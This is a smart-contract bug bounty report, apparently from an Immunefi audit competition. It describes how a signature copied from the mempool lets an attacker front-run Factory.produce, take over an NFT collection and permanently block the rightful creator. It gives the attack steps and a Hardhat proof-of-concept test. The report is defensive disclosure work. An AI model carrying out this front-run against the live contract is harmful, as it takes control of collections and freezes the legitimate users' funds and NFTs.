# 57927 sc medium front run takeover in factory produce

**Submitted on Oct 29th 2025 at 13:44:42 UTC by @koko7 for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57927
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/platform/Factory.sol>
* **Impacts:**
  * Permanent freezing of funds
  * Permanent freezing of NFTs

## Description

### Brief/Intro

An attacker can front‑run a legitimate `produce` transaction and become the collection creator. The signature validated by `Factory.produce` is not bound to the intended creator nor the specific factory instance. Because the deployment salt is deterministic (`keccak256(abi.encode(name, symbol))`), the attacker permanently DoSes the rightful deployer for that `(name, symbol)` pair.

### Vulnerability Details

* Unsafely scoped signature:
  * `SignatureVerifier.checkAccessTokenInfo` signs only `(name, symbol, contractURI, feeNumerator, chainId)`.
  * Missing binding to the intended `creator` and to `address(this)` (factory), and no nonce/deadline.
* Creator taken from caller:
  * `Factory.produce` sets `creator = msg.sender` after signature verification, allowing any address with the payload to claim ownership.
* Deterministic salt on just `(name, symbol)`:
  * First successful deployment consumes the salt and blocks subsequent attempts with `TokenAlreadyExists`.

Code references:

* contracts/v2/utils/SignatureVerifier.sol → `checkAccessTokenInfo` (lines \~49–74)
* contracts/v2/platform/Factory.sol → `produce` (lines \~230–292), `_metadataHash` (lines \~502–509)

### Impact Details

* Permanent DoS for targeted `(name, symbol)` on this factory.
* Attacker controls the AccessToken collection (owner/upgrade authority), mint params, and “creator” royalty address.

## Attack Path

{% stepper %}
{% step %}

### Step

Backend issues a valid signature for `AccessTokenInfo` (covers only `(name, symbol, contractURI, feeNumerator, chainId)`).
{% endstep %}

{% step %}

### Step

Victim submits `produce(info, referralCode)`; the signature is visible in mempool calldata.
{% endstep %}

{% step %}

### Step

Attacker copies the signature and submits `produce(info, referralCode)` first (higher gas/priority).
{% endstep %}

{% step %}

### Step

Verification passes for attacker (no binding to creator/factory). `creator` is set to attacker’s `msg.sender`.
{% endstep %}

{% step %}

### Step

Victim’s transaction reverts with `TokenAlreadyExists`; attacker retains control of the collection.
{% endstep %}
{% endstepper %}

## References

* Code:
  * contracts/v2/utils/SignatureVerifier.sol → `checkAccessTokenInfo` (49–74)
  * contracts/v2/platform/Factory.sol → `produce` (236–292), `_metadataHash` (502–507)
* Test: `test/v2/platform/factory.test.ts` ("Security: produce hijack")
  * Run: `npx hardhat test test/v2/platform/factory.test.ts --grep "Security: produce hijack"`
* Scope guidance (Immunefi): <https://immunefisupport.zendesk.com/hc/en-us/articles/18150853530001-How-to-know-if-my-bug-is-in-scope>

## Proof of Concept

Add this test to `/home/jo/audit-comp-belong/test/v2/platform/factory.test.ts` and run:

LEDGER\_ADDRESS=0x0000000000000000000000000000000000000001 PK=0x0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef npx hardhat test test/v2/platform/factory.test.ts --grep "Security: produce hijack"

```js
describe('Security: produce hijack', () => {
    it('front-run takeover: signature not bound to creator', async () => {
      const { factory, alice, bob, signer } = await loadFixture(fixture);

      const nftName = 'Hijackable';
      const nftSymbol = 'HJ1';
      const contractURI = 'contractURI/hijack1';
      const price = ethers.utils.parseEther('0.01');
      const feeNumerator = 500;

      // Backend signs only name/symbol/contractURI/feeNumerator/chainId (no creator, no factory)
      const message = hashAccessTokenInfo(nftName, nftSymbol, contractURI, feeNumerator, chainId);
      const signature = EthCrypto.sign(signer.privateKey, message);

      const info: AccessTokenInfoStruct = {
        metadata: { name: nftName, symbol: nftSymbol },
        contractURI,
        paymentToken: NATIVE_CURRENCY_ADDRESS,
        mintPrice: price,
        whitelistMintPrice: price,
        transferable: true,
        maxTotalSupply: BigNumber.from('1000'),
        feeNumerator,
        collectionExpire: BigNumber.from('86400'),
        signature,
      };

      // Attacker (bob) calls produce first with the leaked/obtained signature
      const tx = await factory.connect(bob).produce(info, ethers.constants.HashZero);
      await expect(tx).to.emit(factory, 'AccessTokenCreated');

      const hijacked = await factory.nftInstanceInfo(nftName, nftSymbol);
      console.log('[produce hijack] creator (expected attacker):', hijacked.creator);
      expect(hijacked.creator).to.eq(bob.address);

      // Legitimate creator (alice) is permanently DoSed for this (name,symbol)
      await expect(factory.connect(alice).produce(info, ethers.constants.HashZero)).to.be.revertedWithCustomError(
        factory,
        'TokenAlreadyExists',
      );
    });

    it('attributes referral usage to attacker on hijack', async () => {
      const { factory, alice, bob, charlie, signer } = await loadFixture(fixture);

      await factory.connect(charlie).createReferralCode();
      const referralCode = await factory.getReferralCodeByCreator(charlie.address);

      const nftName = 'HijackRef';
      const nftSymbol = 'HJR';
      const contractURI = 'contractURI/hijack-ref';
      const price = ethers.utils.parseEther('0.01');
      const feeNumerator = 500;

      const message = hashAccessTokenInfo(nftName, nftSymbol, contractURI, feeNumerator, chainId);
      const signature = EthCrypto.sign(signer.privateKey, message);
      const info: AccessTokenInfoStruct = {
        metadata: { name: nftName, symbol: nftSymbol },
        contractURI,
        paymentToken: NATIVE_CURRENCY_ADDRESS,
        mintPrice: price,
        whitelistMintPrice: price,
        transferable: true,
        maxTotalSupply: BigNumber.from('1000'),
        feeNumerator,
        collectionExpire: BigNumber.from('86400'),
        signature,
      };

      await factory.connect(bob).produce(info, referralCode);
      const hijacked = await factory.nftInstanceInfo(nftName, nftSymbol);
      expect(hijacked.creator).to.eq(bob.address);

      expect(await factory.usedCode(bob.address, referralCode)).to.eq(1);

      await expect(factory.connect(alice).produce(info, referralCode)).to.be.revertedWithCustomError(
        factory,
        'TokenAlreadyExists',
      );
    });
  });
```
